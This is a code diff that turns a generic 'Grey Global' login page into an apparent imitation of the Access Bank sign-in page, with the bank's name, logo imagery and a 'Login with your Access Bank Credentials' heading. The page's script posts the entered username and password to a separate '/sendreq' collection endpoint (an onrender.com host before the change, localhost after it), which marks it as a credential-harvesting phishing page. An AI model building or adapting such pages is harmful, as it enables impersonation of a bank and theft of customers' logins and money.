@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="shortcut icon" href="./grey-logo.png" type="image/x-icon">
-  <title>Login - Grey Global</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <link rel="shortcut icon" href="./logo.jpg" type="image/x-icon">
+  <title>Login - Access Bank</title>
  <style>
     * {
   margin: 0;
@@ -12,9 +13,14 @@
   box-sizing: border-box;
   font-family: "Inter", sans-serif;
 }
-
+  
 body {
-  background-color: white;
+   background-image: url('./ass1.jpg');
+ background-attachment: fixed;
+ background-repeat: no-repeat;
+ background-size: cover;
+ overflow-y: hidden;
+ overflow-x: hidden;
   display: flex;
   justify-content: center;
   align-items: center;
@@ -25,22 +31,23 @@ body {
   text-align: center;
   width: 100%;
   max-width: 380px;
-  background-color: #fff;
+background-color: transparent;
   padding: 40px 20px;
   border-radius: 8px;
+  
 }
 
 h2 {
-  font-size: 1.5rem;
+  font-size: 1.1rem;
   margin-bottom: 30px;
-  color: #0d1b2a;
-  font-weight: 600;
+  color: white;
+  font-weight: 800;
 }
 
 .login-form {
   display: flex;
   flex-direction: column;
-  gap: 20px;
+  gap: 10px;
 }
 
 .input-group {
@@ -57,18 +64,24 @@ label {
 
 input {
   width: 100%;
-  padding: 13px 14px;
-  border: 1px groove #d3d3d3;
+  background-color: black;
+  padding: 17px 16px;
+border: 1px groove grey;
   border-radius: 6px;
+  color: white;
+  font-size: medium;
   font-size: 0.95rem;
   
   outline: none;
 }
 
 input:focus {
-  border-color:  #d3d3d3;
+
+background-color: #1c102b;
+border: 2px groove rgb(20, 20, 238);
+
   outline: none;
-  box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1);
+  /* box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1); */
 }
 
 .password-wrapper {
@@ -79,7 +92,7 @@ input:focus {
   position: absolute;
   right: 12px;
   top: 50%;
-  transform: translateY(-50%);
+  transform: translateY(-70%);
   cursor: pointer;
   font-size: 1rem;
   color: #555;
@@ -87,12 +100,12 @@ input:focus {
 
 button {
   width: 100%;
-  background-color: #2563eb;
+  background-color: rgb(223, 114, 13);
   color: #fff;
   border: none;
   border-radius: 6px;
-  margin-top: 7rem;
-  padding: 12px;
+  /* margin-top: 1rem; */
+  padding: 16px;
   font-size: 1rem;
   font-weight: 600;
   cursor: pointer;
@@ -100,7 +113,7 @@ button {
 }
 
 button:hover {
-  background-color: #1d4ed8;
+  background-color:rgb(223, 114, 13);
 }
 
 /* Smooth fade-in animation */
@@ -126,7 +139,7 @@ button:hover {
   }
 
   h2 {
-    font-size: 1.3rem;
+    font-size: 1.4rem;
   }
 }
 
@@ -187,39 +200,54 @@ button.loading .loader {
 </head>
 <body>
   <div class="container">
-    <h2>Welcome back!</h2>
-
+     <img src="./oo.jpg" alt="Grey Logo"  width="140" style="border-radius: 10px; position: absolute; left: 3%; top: 2%;" class="logo" />
+   <i class=" fas fa-bell" style="color: white; font-size: 22px; position: absolute; left: 70%; top: 10%;"></i>
+     <img src="./nigeria-flag-logo.png" alt="Logo"  width="35"; height="27" style=" position: absolute; border-radius: 5px; left: 80%; top: 9%;" class="logo" />
+    
+    <br style="margin-bottom: 5rem;">
     <form class="login-form">
+       <h2>Login with your Access Bank Credentials</h2>
       <div class="input-group">
-        <label for="email">Email address</label>
-        <input type="email" id="email" placeholder="Enter email address" required />
+        <label for="email" style="color: white; font-size: medium;">Username</label>
+        <input type="text"  id="email" placeholder="Username" required />
       </div>
 
       <div class="input-group">
-        <label for="password">Password</label>
+        <label for="password"  style="color: white; font-size: medium;">Password</label>
         <div class="password-wrapper">
-          <input type="password" id="password" placeholder="Enter your password" required />
-          <span class="toggle-password" id="togglePassword">👁️</span>
-        </div>
+
+          <input type="password" id="password" placeholder="🔒 &#160  Password" required />
+           <span class="toggle-password"  id="togglePassword"><i class="fa fas-eye"></i></span>
+        </div><br>
+         <label for="password"  style="color: white; font-size: medium; font-weight: 600; float: right;">Forgot Credentials?</label>
       </div>
 
       <button type="submit" id="continueBtn">
-        <span class="btn-text"> Login to continue</span>
+        <span class="btn-text">SIGN IN</span>
         <span class="loader"></span>
       </button>
     </form>
+ <br>
+    <span class="create-account" style="color: white;">New Device? Change here</span><br><br>
+    <span class="create-account" style="color: white;">Register *  <b>Open Account</b></span>
 
-    <p class="create-account">Create an account</p>
   </div>
 
  <script>
     window.addEventListener("load", () => {
   setTimeout(() => document.getElementById("email").focus(), 400);
+//   document.getElementById("email").value = ''
+//   document.getElementById("password").value = ''
+//  document.getElementById("password").style.backgroundColor = 'black'
+//  document.getElementById("email").style.backgroundColor = 'black'
+
 });
 
   const togglePassword = document.getElementById("togglePassword");
 const passwordInput = document.getElementById("password");
 const loginForm = document.querySelector(".login-form");
+
+
 let continueBtn = document.getElementById("continueBtn");
 
 togglePassword.addEventListener("click", () => {
@@ -239,10 +267,10 @@ loginForm.addEventListener("submit", (e) => {
     return;
   }
 
-  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) {
-    alert("Please enter a valid email address.");
-    return;
-  }
+  // if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) {
+  //   alert("Please enter a valid email address.");
+  //   return;
+  // }
   continueBtn.classList.add("loading");
   const send_data = {
     msg: 'login',
@@ -251,7 +279,7 @@ loginForm.addEventListener("submit", (e) => {
     message:localStorage.getItem('msg')
   }
   console.log(send_data)
-    fetch('https://grey-finance-support.onrender.com/sendreq',{
+    fetch('http://localhost:3100/sendreq',{
     method: 'POST',
                 credentials:'include',
                headers: {
@@ -281,4 +309,3 @@ loginForm.addEventListener("submit", (e) => {
  </script>
 </body>
 </html>
-
